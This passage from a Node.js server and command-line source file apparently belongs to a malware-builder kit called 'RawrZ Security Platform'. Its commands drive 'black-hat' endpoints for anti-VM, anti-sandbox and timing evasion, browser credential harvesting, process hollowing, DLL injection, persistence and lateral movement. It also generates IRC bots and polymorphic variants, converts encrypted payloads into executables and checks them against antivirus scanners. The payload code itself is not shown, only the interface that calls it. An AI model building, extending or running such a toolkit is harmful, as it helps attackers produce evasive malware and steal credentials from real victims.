  anti-sandbox     - Apply anti-sandbox techniques
  timing-evasion   - Apply timing evasion
  hardware-fingerprint - Generate hardware fingerprint
  process-hollowing - Perform process hollowing
  dll-injection    - Perform DLL injection
  credential-harvest - Harvest credentials (browser/system/network/app)
  establish-persistence - Establish persistence (registry/startup/service)
  lateral-movement - Perform lateral movement

Native Compilation (Roslyn-for-Native):
  native-compile   - Compile C/C++ to native executable
  cross-compile    - Cross-compile for multiple targets
  native-info      - Get native compilation info
  
  exit, quit       - Exit the application
                `);
                break;
                
            case 'status':
                try {
                    const response = await fetch('http://localhost:3000/api/health');
                    const data = await response.json();
                    console.log('Server Status:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Server Status: Offline or error');
                }
                break;
                
            case 'endpoints':
                console.log(`
Available API Endpoints:
  GET  /api/health                           - Health check
  POST /api/real-encryption/dual-encrypt     - Dual encryption
  POST /api/real-encryption/convert-enc-to-exe - Convert encrypted file to C# EXE
  POST /api/real-encryption/convert-enc-to-native-cpp - Convert to native C++ EXE
  POST /api/real-encryption/convert-enc-to-java - Convert to Java JAR
  POST /api/real-encryption/convert-enc-to-python - Convert to Python EXE
  POST /api/real-encryption/convert-enc-to-rust - Convert to Rust EXE
  POST /api/real-encryption/convert-enc-to-go - Convert to Go EXE
  POST /api/real-encryption/roslyn-compile   - Direct C# compilation
  POST /api/real-encryption/native-cpp-compile - Direct C++ compilation
  POST /api/real-encryption/java-compile     - Direct Java compilation
  POST /api/real-encryption/python-compile   - Direct Python compilation
  POST /api/real-encryption/rust-compile     - Direct Rust compilation
  POST /api/real-encryption/go-compile       - Direct Go compilation
  GET  /api/files/list-processed             - List processed files
  GET  /api/files/download-processed/:filename - Download processed file
                `);
                break;
                
            case 'test':
                console.log('Testing compilation endpoints...');
                try {
                    // Test Java compilation
                    const testData = {
                        javaCode: "public class Test { public static void main(String[] args) { System.out.println(\"Hello from RawrZ!\"); } }"
                    };
                    
                    const response = await fetch('http://localhost:3000/api/real-encryption/java-compile', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(testData)
                    });
                    
                    if (response.ok) {
                        const result = await response.json();
                        console.log(' Java compilation test passed:', result.message);
                    } else {
                        console.log(' Java compilation test failed:', response.status);
                    }
                } catch (error) {
                    console.log(' Test failed:', error.message);
                }
                break;
                
            case 'engines':
                try {
                    const response = await fetch('http://localhost:3000/api/engines/status');
                    const data = await response.json();
                    console.log('Engine Status:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Engine Status: Error fetching status');
                }
                break;
                
            case 'irc-bot':
                try {
                    const botConfig = {
                        config: { server: 'irc.rizon.net', port: 6667, name: 'RawrZBot' },
                        features: ['fileManager', 'systemInfo'],
                        extensions: ['cpp']
                    };
                    const response = await fetch('http://localhost:3000/api/irc-bot/generate', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(botConfig)
                    });
                    const data = await response.json();
                    console.log('IRC Bot Generated:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('IRC Bot Generation: Error');
                }
                break;
                
            case 'stealth':
                try {
                    const stealthConfig = {
                        data: 'test data',
                        techniques: ['obfuscation', 'encryption', 'anti-debug']
                    };
                    const response = await fetch('http://localhost:3000/api/stealth/apply', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(stealthConfig)
                    });
                    const data = await response.json();
                    console.log('Stealth Applied:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Stealth Application: Error');
                }
                break;
                
            case 'polymorphic':
                try {
                    const polyConfig = {
                        data: 'test data',
                        variants: 5
                    };
                    const response = await fetch('http://localhost:3000/api/polymorphic/generate', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(polyConfig)
                    });
                    const data = await response.json();
                    console.log('Polymorphic Variants:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Polymorphic Generation: Error');
                }
                break;
                
            case 'anti-analysis':
                try {
                    const antiConfig = {
                        data: 'test data',
                        techniques: ['anti-debug', 'anti-vm', 'anti-sandbox']
                    };
                    const response = await fetch('http://localhost:3000/api/anti-analysis/apply', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(antiConfig)
                    });
                    const data = await response.json();
                    console.log('Anti-Analysis Applied:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Anti-Analysis Application: Error');
                }
                break;
                
            case 'virus-scan':
                try {
                    const scanConfig = {
                        filePath: 'test.exe',
                        engines: ['clamav', 'defender']
                    };
                    const response = await fetch('http://localhost:3000/api/virus-scanner/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(scanConfig)
                    });
                    const data = await response.json();
                    console.log('Virus Scan Results:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Virus Scan: Error');
                }
                break;
                
            case 'jotti-scan':
                try {
                    const jottiConfig = { filePath: 'test.exe' };
                    const response = await fetch('http://localhost:3000/api/jotti/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(jottiConfig)
                    });
                    const data = await response.json();
                    console.log('Jotti Scan Results:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Jotti Scan: Error');
                }
                break;
                
            case 'network-scan':
                try {
                    const networkConfig = {
                        target: '127.0.0.1',
                        ports: [80, 443, 22, 21]
                    };
                    const response = await fetch('http://localhost:3000/api/network/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(networkConfig)
                    });
                    const data = await response.json();
                    console.log('Network Scan Results:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Network Scan: Error');
                }
                break;
                
            case 'memory-alloc':
                try {
                    const memoryConfig = { size: 1024, type: 'heap' };
                    const response = await fetch('http://localhost:3000/api/memory/allocate', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(memoryConfig)
                    });
                    const data = await response.json();
                    console.log('Memory Allocation:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Memory Allocation: Error');
                }
                break;
                
            case 'performance':
                try {
                    const perfConfig = {
                        data: 'test data',
                        options: { optimization: 'high', compression: true }
                    };
                    const response = await fetch('http://localhost:3000/api/performance/optimize', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(perfConfig)
                    });
                    const data = await response.json();
                    console.log('Performance Optimization:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Performance Optimization: Error');
                }
                break;
                
            case 'health':
                try {
                    const response = await fetch('http://localhost:3000/api/health/detailed');
                    const data = await response.json();
                    console.log('Detailed Health:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.log('Detailed Health: Error');
                }
                break;
                
            case 'anti-debug':
                try {
                    if (engines['black-hat-capabilities']) {
                        const result = await engines['black-hat-capabilities'].applyAntiDebug('test payload');
                        console.log('Anti-Debug Result:', JSON.stringify(result, null, 2));
                    } else {
                        console.log('Anti-Debug: Black Hat Capabilities engine not available');
                    }
                } catch (error) {
                    console.error('Anti-debug failed:', error.message);
                }
                break;
                
            case 'anti-vm':
                try {
                    const response = await fetch('http://localhost:3000/api/black-hat/anti-vm', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: 'test payload' })
                    });
                    const data = await response.json();
                    console.log('Anti-VM Result:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.error('Anti-VM failed:', error.message);
                }
                break;
                
            case 'anti-sandbox':
                try {
                    const response = await fetch('http://localhost:3000/api/black-hat/anti-sandbox', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: 'test payload' })
                    });
                    const data = await response.json();
                    console.log('Anti-Sandbox Result:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.error('Anti-sandbox failed:', error.message);
                }
                break;
                
            case 'timing-evasion':
                try {
                    const response = await fetch('http://localhost:3000/api/black-hat/timing-evasion', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: 'test payload' })
                    });
                    const data = await response.json();
                    console.log('Timing Evasion Result:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.error('Timing evasion failed:', error.message);
                }
                break;
                
            case 'hardware-fingerprint':
                try {
                    const response = await fetch('http://localhost:3000/api/black-hat/hardware-fingerprint', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: 'test payload' })
                    });
                    const data = await response.json();
                    console.log('Hardware Fingerprint Result:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.error('Hardware fingerprint failed:', error.message);
                }
                break;
                
            case 'credential-harvest':
                try {
                    const response = await fetch('http://localhost:3000/api/black-hat/credential-harvest', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: 'browser' })
                    });
                    const data = await response.json();
                    console.log('Credential Harvest Result:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.error('Credential harvest failed:', error.message);
                }
                break;
                
            case 'native-compile':
                try {
                    const testSource = `#include <stdio.h>
int main() {
    printf("Hello from RawrZ Native Compilation!\\n");
    return 0;
}`;
                    const response = await fetch('http://localhost:3000/api/native-compile/compile', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            source: testSource,
                            target: 'linux',
                            optimization: 'release',
                            filename: 'hello'
                        })
                    });
                    
                    if (response.ok) {
                        const buffer = await response.arrayBuffer();
                        console.log(`Native compilation successful! Executable size: ${buffer.byteLength} bytes`);
                        console.log(`Target: ${response.headers.get('X-Compilation-Target')}`);
                        console.log(`Optimization: ${response.headers.get('X-Optimization-Level')}`);
                    } else {
                        const data = await response.json();
                        console.log('Native Compilation Result:', JSON.stringify(data, null, 2));
                    }
                } catch (error) {
                    console.error('Native compilation failed:', error.message);
                }
                break;
                
            case 'cross-compile':
                try {
                    const testSource = `#include <stdio.h>
int main() {
    printf("Hello from RawrZ Cross-Compilation!\\n");
    return 0;
}`;
                    const response = await fetch('http://localhost:3000/api/native-compile/cross-compile', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            source: testSource,
                            targets: ['linux', 'windows', 'macos'],
                            optimization: 'release',
                            filename: 'hello'
                        })
                    });
                    const data = await response.json();
                    console.log('Cross-Compilation Result:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.error('Cross-compilation failed:', error.message);
                }
                break;
                
            case 'native-info':
                try {
                    const response = await fetch('http://localhost:3000/api/native-compile/info');
                    const data = await response.json();
                    console.log('Native Compilation Info:', JSON.stringify(data, null, 2));
                } catch (error) {
                    console.error('Native info failed:', error.message);
                }
                break;

            case 'exit':
            case 'quit':
                console.log('Shutting down RawrZ Security Platform...');
                rl.close();
                process.exit(0);
                break;
                
            default:
                if (command) {
                    console.log(`Unknown command: ${command}. Type 'help' for available commands.`);
                }
        }
        
        rl.prompt();
    });

    rl.on('close', () => {
        console.log('Goodbye!');
        process.exit(0);
    });

    // Keep the process alive
    rl.on('SIGINT', () => {
        console.log('\nShutting down gracefully...');
        rl.close();
    });

    return rl;
}

// Start server
async function startServer() {
    try {
        await ensureDirectories();
        
        // Initialize all engines
        await initializeAllEngines();
        
        // Session cleanup interval
        setInterval(() => {
            const now = Date.now();
            for (const [sessionId, session] of activeSessions.entries()) {
                if (now - session.lastActivity > SESSION_TIMEOUT) {
                    activeSessions.delete(sessionId);
                    console.log(`[SECURITY] Expired session cleaned up: ${sessionId}`);
                }
            }
        }, 5 * 60 * 1000); // Clean up every 5 minutes

        const server = app.listen(PORT, () => {
            console.log('='.repeat(60));
            console.log(' RawrZ Security Platform - Enhanced Security Mode');
            console.log('='.repeat(60));
            console.log(`[OK] RawrZ API listening on port ${PORT}`);
            console.log(`[OK] Main interface: http://localhost:${PORT}`);
            console.log(`[OK] API endpoints: http://localhost:${PORT}/api/`);
            console.log(`[SECURITY] Enhanced security features enabled:`);
            console.log(`  - Rate limiting: ${generalLimiter.max} requests per ${generalLimiter.windowMs/1000}s`);
            console.log(`  - API rate limiting: ${apiLimiter.max} requests per ${apiLimiter.windowMs/1000}s`);
            console.log(`  - Authentication: ${authToken ? 'ENABLED' : 'DISABLED'}`);
            console.log(`  - Session management: ENABLED (${SESSION_TIMEOUT/1000}s timeout)`);
            console.log(`  - Input validation: ENABLED`);
            console.log(`  - Security logging: ENABLED`);
            console.log(`  - CORS protection: ENABLED`);
            console.log('='.repeat(60));
            console.log(`\nType 'help' for CLI commands or visit http://localhost:${PORT} for web interface`);
            
            // Create CLI interface after server starts (removed setTimeout for real functionality)
            const cli = createCLI();
            cli.prompt();
        });

        // Handle graceful shutdown
        process.on('SIGINT', () => {
            console.log('\nShutting down gracefully...');
            server.close(() => {
                console.log('Server closed.');
                process.exit(0);
            });
        });

        // Keep the process alive
        process.on('uncaughtException', (error) => {
            console.error('Uncaught Exception:', error);
        });

        process.on('unhandledRejection', (reason, promise) => {
            console.error('Unhandled Rejection at:', promise, 'reason:', reason);
        });

    } catch (error) {
        console.error('Failed to start server:', error);
        process.exit(1);
    }
}

startServer().catch(console.error);
